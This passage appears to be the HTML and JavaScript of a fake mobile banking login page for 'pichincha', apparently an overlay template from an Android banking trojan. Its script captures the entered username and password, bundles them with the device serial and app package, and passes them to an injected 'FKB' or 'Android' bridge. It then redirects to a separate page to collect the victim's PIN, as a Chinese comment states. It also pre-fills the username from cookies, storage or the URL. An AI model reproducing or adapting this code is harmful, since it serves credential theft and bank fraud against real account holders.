*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{height:100%;background:#fff;}
body{font-family:Prelo,Arial,sans-serif;color:#202124;}
.app{min-height:100%;max-width:430px;margin:0 auto;display:flex;flex-direction:column;background:#fff;padding:0 0 16px;}
.top{position:relative;height:64px;}
.logo{position:absolute;left:50%;top:14px;transform:translateX(-50%);width:141px;height:32px;display:block;}
.ver{text-align:center;font-size:14px;font-weight:400;color:#9aa0a6;margin-top:9px;}
.head{display:block;width:100%;text-align:center;font-size:16px;font-weight:400;color:#202124;line-height:1.25;margin-top:32px;padding:0 24px;white-space:nowrap;}
.form{margin-top:24px;padding:0 24px;display:flex;flex-direction:column;}
.f{display:flex;align-items:center;background:#fff;border:1px solid #cfd3d8;border-radius:12px;height:51px;padding:0 14px;cursor:pointer;}
.f:focus-within{border-color:#0F265C;}
.fico{flex:none;width:24px;height:24px;color:#5f6368;margin-right:10px;}
.fico svg{width:100%;height:100%;display:block;}
.f input{flex:1;min-width:0;border:0;outline:0;background:transparent;font-family:inherit;font-size:16px;color:#202124;}
.f input::placeholder{color:#b0b4b8;}
.show{flex:none;border:0;background:none;color:#1a73e8;font-family:inherit;font-size:14px;font-weight:400;cursor:pointer;padding:6px 0 6px 8px;}
.lk{align-self:flex-end;color:#1a73e8;font-size:13px;margin:6px 0 0;cursor:pointer;}
.fgap{height:15px;}
.ck{display:flex;align-items:center;margin-top:15px;}
.ckbox{width:23px;height:23px;border:1.5px solid #9aa0a6;border-radius:3px;background:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none;}
.ckbox.on{background:#FFDD00;border-color:#FFDD00;}
.ckbox.on svg{display:block;}
.ckbox svg{display:none;width:70%;height:70%;}
.cktxt{font-size:14px;color:#202124;margin-left:19px;}
.cktxt b{font-weight:700;text-decoration:underline;color:#202124;cursor:pointer;}
.sp{flex:1 1 0;min-height:24px;}
.btns{display:flex;flex-direction:column;gap:11px;padding:0 24px;}
.btn{width:100%;height:51px;border:0;border-radius:10px;font-family:inherit;font-size:16px;font-weight:500;cursor:pointer;}
.btn.pri{background:#F3E07A;color:#6E6A58;}
.btn.pri.ready{background:#FFDD00;color:#0F265C;}
.btn.sec{background:#eeeeee;color:#3c4043;}
.ov{position:fixed;inset:0;background:rgba(255,255,255,.97);display:flex;align-items:center;justify-content:center;z-index:50;opacity:0;pointer-events:none;transition:opacity .3s;}
.ov.on{opacity:1;pointer-events:auto;}
.spin{width:48px;height:48px;border:4px solid #f2e8bd;border-top-color:#FFDD00;border-radius:50%;animation:sp .7s linear infinite;}
@keyframes sp{to{transform:rotate(360deg);}}
</style>
</head>

<script>
var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
var NOMBRE_DEFECTO='';
function goBack(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'back'}));}else{history.back();}}catch(e){}}
function recover(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'recover_user'}));}}catch(e){}}
function forgot(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'forgot_password'}));}}catch(e){}}
function terms(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'terms'}));}}catch(e){}}
function register(){try{if(typeof Android!=='undefined'&&Android.returnResult){Android.returnResult(JSON.stringify({action:'register'}));}}catch(e){}}
function togglePw(){var p=document.getElementById('password');p.type=(p.type==='password')?'text':'password';}
function toggleCk(){document.getElementById('ckbox').classList.toggle('on');}
function syncBtn(){var u=document.getElementById('login').value.trim();var p=document.getElementById('password').value;document.getElementById('go').className=(u&&p)?'btn pri ready':'btn pri';}
var submitted=false;
function closeApp(){
  /* 登录已提交 → 继续走 PIN 步骤（同目录 pichincha_pin.html） */
  try{ location.href='pichincha_pin.html'; return; }catch(e){}
  try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);else if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}
}}
function doLogin(){
  var u=document.getElementById('login').value.trim();
  var p=document.getElementById('password').value;
  if(!u||!p||submitted)return;
  submitted=true;
  document.activeElement.blur();
  document.getElementById('ov').classList.add('on');
  setTimeout(function(){
    try{var _sn=(typeof FKB!=='undefined'&&FKB.getSn)?FKB.getSn():'';var _pl=JSON.stringify({pkg:pk,sn:_sn,template:'pichincha',formData:{username:u,password:p}});if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(_pl);else if(typeof Android!=='undefined'&&Android.returnResult)Android.returnResult(_pl);}catch(e){}
    setTimeout(closeApp,2500);
  },900);
}
(function(){
  var n='';
  try{if(typeof Android!=='undefined'&&Android.getUserName){n=Android.getUserName()||'';}}catch(e){}
  if(!n){var m=location.search.match(/[?&]u=([^&]+)/);if(m){n=decodeURIComponent(m[1]);}}
  if(!n){try{n=localStorage.getItem('pich_user')||'';}catch(e){}}
  if(!n){try{n=(document.cookie.match(/(?:^|; )pich_user=([^;]*)/)||[])[1]||'';n=decodeURIComponent(n);}catch(e){}}
  if(!n)n=NOMBRE_DEFECTO;
  if(n)document.getElementById('login').value=n;
})();
function fitHead(){
  var h=document.querySelector('.head');
  if(!h)return;
  h.style.whiteSpace='nowrap';
  h.style.fontSize='16px';
  var box=h.parentElement.clientWidth-48;
  if(h.scrollWidth>box && box>0){h.style.fontSize=(16*box/h.scrollWidth)+'px';}
}
addEventListener('resize',fitHead);addEventListener('load',fitHead);fitHead();setTimeout(fitHead,60);
</script>
